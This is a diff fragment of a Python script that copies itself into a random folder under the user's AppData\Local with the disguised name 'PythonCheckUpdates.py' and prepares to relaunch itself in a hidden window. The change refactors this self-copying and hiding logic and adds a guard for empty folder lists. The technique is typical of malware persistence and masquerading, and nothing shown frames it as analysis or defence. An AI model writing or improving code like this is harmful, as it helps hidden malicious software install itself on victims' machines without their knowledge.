@@ -14,11 +14,16 @@ except:
 
 currentpath = os.path.abspath(__file__)
 appdatalocal = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local')
-if not appdatalocal in currentpath:
-    folders = [f for f in os.listdir(appdatalocal) if os.path.isdir(os.path.join(appdatalocal, f)) and f not in {'Temp', 'Packages', 'Microsoft', 'CrashDumps'}]
-    destinationfolder = os.path.join(appdatalocal, random.choice(folders))
-    destinationpath = os.path.join(destinationfolder, os.path.basename('PythonCheckUpdates.py'))
-    shutil.copy2(os.path.abspath(__file__), destinationpath)
+destinationpath = os.path.abspath(__file__)
+
+if appdatalocal not in currentpath:
+    folders = [f for f in os.listdir(appdatalocal) 
+              if os.path.isdir(os.path.join(appdatalocal, f)) 
+              and f not in {'Temp', 'Packages', 'Microsoft', 'CrashDumps'}]
+    if folders:
+        destinationfolder = os.path.join(appdatalocal, random.choice(folders))
+        destinationpath = os.path.join(destinationfolder, os.path.basename('PythonCheckUpdates.py'))
+        shutil.copy2(os.path.abspath(__file__), destinationpath)
     startupinfo = subprocess.STARTUPINFO()
     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 
